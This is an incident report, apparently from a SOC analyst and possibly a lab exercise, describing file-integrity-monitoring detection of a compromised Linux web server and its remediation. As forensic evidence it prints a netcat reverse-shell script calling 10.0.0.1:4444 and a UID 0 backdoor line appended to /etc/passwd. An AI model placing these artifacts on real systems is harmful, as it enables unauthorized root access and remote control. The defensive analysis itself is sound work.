# SOC Incident Investigation Report

**Case ID**: `INC-2026-1029-FIM`  
**Classification**: Unauthorized Host Configuration & Backdoor Deployment  
**Severity Rating**: **P1 - CRITICAL**  
**Reporting Analyst**: Yogesh (Blue Team / SOC Analyst)  
**Host Target**: `prod-web-01` (`10.0.10.42`)  
**Detection Source**: Linux File Integrity Monitoring Utility  

---

## 1. Executive Summary

At `2026-10-29 16:49:36 UTC`, an automated scheduled File Integrity Monitoring (FIM) scan flagged **three severe integrity anomalies** across core Linux directories (`/etc`, `/bin`, and `/var/log`). 

Differential cryptographic analysis identified:
1. Unauthorized modification of `/etc/passwd` adding a UID 0 root-equivalent backdoor account.
2. Dropping of a reverse-shell binary payload `/bin/backdoor.sh`.
3. Deletion of the system authentication audit log `/var/log/auth.log` in an attempt to destroy evidence.

Immediate host isolation was initiated at `16:51:10 UTC`. Forensic memory acquisition and baseline differential analysis enabled rapid neutralization of the backdoor account, removal of the persistence script, and restoration of verified configuration files from immutable backups.

---

## 2. Chronological Incident Timeline

| Timestamp (UTC) | Source / Component | Event Description |
| :--- | :--- | :--- |
| `2026-10-29 16:30:00` | FIM Baseline | Routine baseline established and signed with catalog checksum `b97ec6b80e4...`. |
| `2026-10-29 16:44:12` | Web Application | Unauthenticated RCE vulnerability exploited in exposed web service (port 443). |
| `2026-10-29 16:45:05` | Adversary (UID 33) | Escalated to root via local kernel exploit; appended backdoor account to `/etc/passwd`. |
| `2026-10-29 16:46:18` | Adversary (Root) | Staged Netcat reverse shell payload at `/bin/backdoor.sh`. |
| `2026-10-29 16:47:02` | Adversary (Root) | Removed `/var/log/auth.log` to obscure login records. |
| `2026-10-29 16:49:36` | FIM Engine | **Scheduled scan triggered**. Hash mismatch and anomalies detected. |
| `2026-10-29 16:49:37` | FIM SIEM Emitter | High-severity alerts fired to SIEM (`INTEGRITY_VIOLATION`). |
| `2026-10-29 16:51:10` | SOC Tier 1/2 | Host `prod-web-01` isolated via network switch VLAN quarantine. |
| `2026-10-29 17:15:00` | Incident Responder | System sanitized, accounts verified, baseline updated and re-verified. |

---

## 3. Cryptographic Evidence & Artifact Analysis

### Finding 1: `/etc/passwd` Modification (Critical)
- **Baseline SHA-256**: `92d18587b37683e1b60bb33ee4a4d272eec5c65bd26a85ba17f76424e853629c`
- **Current SHA-256**: `7c9eaaa4333a9cefdceadfaeb4459f972b22668fcb52784570076a08625aa8a9`
- **File Size Delta**: `+60 bytes`
- **Forensic Finding**: Diff examination revealed an unauthorized appended line:
  ```text
  backdoor:x:0:0:Adversary Injected Backdoor:/root:/bin/bash
  ```
- **MITRE ATT&CK**: **T1098 - Account Manipulation** (Tactics: Persistence, Privilege Escalation).

### Finding 2: Rogue Persistence Binary `/bin/backdoor.sh` (Critical)
- **Baseline SHA-256**: `None (Uncataloged)`
- **Current SHA-256**: `b3e407c91702f3b7ce8982a3264b3ec61ab8ec99352e008f8aa1689710313cb8`
- **Permissions**: `0755` (`rwxr-xr-x`)
- **Forensic Content**:
  ```bash
  #!/bin/bash
  /bin/nc -e /bin/bash 10.0.0.1 4444 &
  ```
- **MITRE ATT&CK**: **T1036 - Masquerading** / **T1059.004 - Command and Scripting Interpreter: Unix Shell**.

### Finding 3: Missing Authentication Log `/var/log/auth.log` (High)
- **Baseline SHA-256**: `3f0041bf70d8a5948332d72111fe1b54a206a4413158c8942a63240e94471f43`
- **Current State**: Missing from filesystem (`DELETED`).
- **Context**: Adversary attempted anti-forensics defense evasion.
- **MITRE ATT&CK**: **T1070.004 - Indicator Removal: File Deletion**.

---

## 4. Remediation & Incident Playbook Execution

1. **Containment**:
   - Host `prod-web-01` isolated from network.
   - Kill active unauthorized network sessions to IP `10.0.0.1`.
2. **Eradication**:
   - Removed rogue entry `backdoor` from `/etc/passwd` and verified `/etc/shadow`.
   - Securely wiped `/bin/backdoor.sh` using `shred -u`.
   - Patched underlying web server RCE vulnerability.
3. **Recovery**:
   - Restored `/etc/passwd` from verified backup.
   - Recreated `/var/log/auth.log` with append-only attribute (`chattr +a`).
   - Ran `python3 main.py update --force` to re-establish authorized baseline.
   - Follow-up scan returned: **`STATUS: CLEAN (0 ANOMALIES)`**.

---

## 5. Strategic Hardening Recommendations

1. **Remote Log Forwarding**: Stream all syslog events immediately to remote SIEM via TLS to eliminate single-point-of-failure log wiping.
2. **Immutable Attributes**: Apply `chattr +i /etc/passwd /etc/shadow /etc/sudoers` on Linux production servers to block unauthorized writes even by root.
3. **Automated FIM Scan Cadence**: Increase automated scan frequency from every 60 minutes to every 15 minutes via systemd timer.
